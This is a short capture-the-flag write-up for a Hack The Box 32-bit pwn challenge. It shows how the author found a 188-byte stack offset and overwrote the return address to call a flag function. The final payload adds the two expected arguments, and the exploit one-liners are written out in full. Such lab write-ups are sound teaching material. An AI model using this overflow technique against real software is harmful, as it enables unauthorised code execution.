# You know 0xDiablos ~ HTB ~ Pwn Challenge
## Solver: Eyal Asulin
I started with basic checks on the ELF file:
- There are not any security techniques enabled. (Cannary, NX, ASLR)
- i386 | 32 bit -> little indian
- function vuln() : 0x08049272
- function flag() : 0x080491e2

By msf-pattern tools and GDB, I found that the return address stored 188 offset bytes on the stack. 

|   STACK FRAME  | |
| ------------ | ------------ |
|  return address | 4 bytes [target]  |
|  saved ebp |  4 bytes |
|  . |  184 bytes |
|  . |   |
|  . |   |
|  . |   |
| start of buffer |  $esp |

`python2 -c "print '-'*188 + '\xe2\x91\x04\x08'" | (./vuln) (nc [ip] [port])`

By overwrite return address locally we get "Hurry up and try in on server side.", but remotely nothing happens.

So I decided to go through flag function code, and discovered they search for two arguments:
1. 0x08049246 <+100>:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef
2. 0x0804924f <+109>:   cmp    DWORD PTR [ebp+0xc],0xc0ded00d

|   STACK FRAME  | |
| ------------ | ------------ |
| 0xc0ded00d |[argument 2]|
| 0xdeadbeef |[argument 1]|
| padding | 4 bytes |
|  return address | 4 bytes [target]  |
|  saved ebp |  4 bytes |
|  . |  184 bytes |
|  . |   |
|  . |   |
|  . |   |
| start of buffer |  $esp |

`python2 -c "print '-'*188 + '\xe2\x91\x04\x08' + 'PADD' + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0'" | (./vuln) (nc [ip] [port])`


*Written by Eyal Asulin©*
